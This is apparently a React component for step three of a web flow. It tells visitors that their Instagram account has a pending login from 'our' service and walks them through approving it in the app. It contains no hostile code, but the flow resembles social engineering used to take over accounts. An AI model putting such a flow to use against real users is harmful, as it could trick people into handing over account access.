import React from 'react'
import { Ig } from '../icons';

function StepThree() {
    return (
        <>
            <p className="font-black text-white text-[1.75rem] text-center mb-[0.46rem]">Approve our<br />
                login request</p>
            <p className="text-[#CBD5E1] text-center mb-[2.5rem]">Your Instagram account has a pending login<br/> request. To move forward, please confirm our<br/> login request by going to Notifications and<br/> approving our request.</p>

            <div className="w-full rounded-[0.75rem] p-[0.625rem] bg-[#1E293B] border-[0.5px] border-[#334155] flex justify-between transition-all duration-300 ease-in-out flex-col">

                <div className="flex gap-x-2 items-center">
                    <Ig />
                    <div className="flex flex-col">
                        <p className="font-semibold text-white">@username</p>
                        <p className="text-[#CBD5E1] font-sm transition-all duration-300 ease-in-out">Pending approval...</p>
                    </div>
                </div>
                <div className="w-full h-[0.5px] bg-[#334155] my-[0.75rem] transition-all duration-300 ease-in-out" />


                <p className='text-sm italic font-medium'>1. Open your Instagram app</p>
                <p className='text-sm italic font-medium'>2. Go to notifications</p>
                <p className='mb-[0.75rem] text-sm italic font-medium'>3. Confirm our login request</p>

                <div className="px-[1.25rem] py-[0.625rem] rounded-[0.5rem] cursor-pointer text-sm font-semibold bg-gradient-to-r from-[#B36AE9] via-[#EC6189] to-[#FCA74B] flex justify-center items-center full">
                    Open Instagram
                </div>
            </div>
        </>

    )
}

export default StepThree;

